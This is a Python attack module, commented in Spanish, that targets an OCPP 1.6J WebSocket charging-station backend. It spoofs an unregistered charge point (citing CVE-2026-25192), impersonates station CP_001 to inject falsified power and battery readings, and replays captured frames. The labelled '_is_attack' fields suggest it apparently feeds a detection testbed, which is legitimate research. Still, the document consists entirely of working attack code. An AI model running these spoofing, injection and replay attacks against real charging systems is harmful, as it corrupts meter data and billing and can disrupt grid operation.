"""Módulo atacante: Suplantación/Inyección (CVE-2026-25192) y Replay Attack."""
import json
import uuid
import asyncio
import random
import websockets


async def run_attack_campaign(target_uri: str, captured_frames: list, steps: int = 20):
    """
    Inyecta 3 tipos de ataques sobre el canal WebSocket OCPP 1.6J:
    1) Suplantación de estación no registrada (CVE-2026-25192).
    2) Inyección de telemetría extrema/anómala suplantando CP_001.
    3) Repetición de tramas legítimas previas (Replay Attack).
    """
    rng = random.Random(101)
    await asyncio.sleep(0.05)  # Esperar a que inicien sesiones legítimas

    # Vector 1: Conexión con ChargePointId falso
    try:
        async with websockets.connect(f"{target_uri}/CP_ROGUE_999") as ws:
            for i in range(5):
                payload = {
                    "step": i, "hour": 14.0, "power_w": 55000.0,
                    "soc": 120.0, "_true_p_next": 12000.0, "_is_attack": True
                }
                await ws.send(json.dumps([2, str(uuid.uuid4()), "MeterValues", payload]))
                await ws.recv()
                await asyncio.sleep(0.01)
    except Exception:
        pass

    # Vector 2 y 3: Suplantación de CP_001 + Inyección de picos + Replay
    async with websockets.connect(f"{target_uri}/CP_001") as ws:
        for i in range(steps):
            if i % 3 == 0 and captured_frames:
                # Replay attack: reenvía trama capturada con mismo UniqueId
                frame = json.loads(rng.choice(captured_frames))
                frame[3]["_is_attack"] = True
                await ws.send(json.dumps(frame))
            elif i % 3 == 1:
                # Inyección de potencia extrema (violación física / Z-score)
                payload = {
                    "step": i, "hour": 18.5, "power_w": rng.uniform(28000.0, 48000.0),
                    "soc": rng.uniform(50.0, 95.0), "_true_p_next": 14000.0, "_is_attack": True
                }
                await ws.send(json.dumps([2, str(uuid.uuid4()), "MeterValues", payload]))
            else:
                # Falsificación brusca de SoC (violación de tasa de cambio)
                payload = {
                    "step": i, "hour": 19.0, "power_w": 21500.0,
                    "soc": 99.0 if i % 2 == 0 else 5.0, "_true_p_next": 15000.0, "_is_attack": True
                }
                await ws.send(json.dumps([2, str(uuid.uuid4()), "MeterValues", payload]))

            await ws.recv()
            await asyncio.sleep(0.015)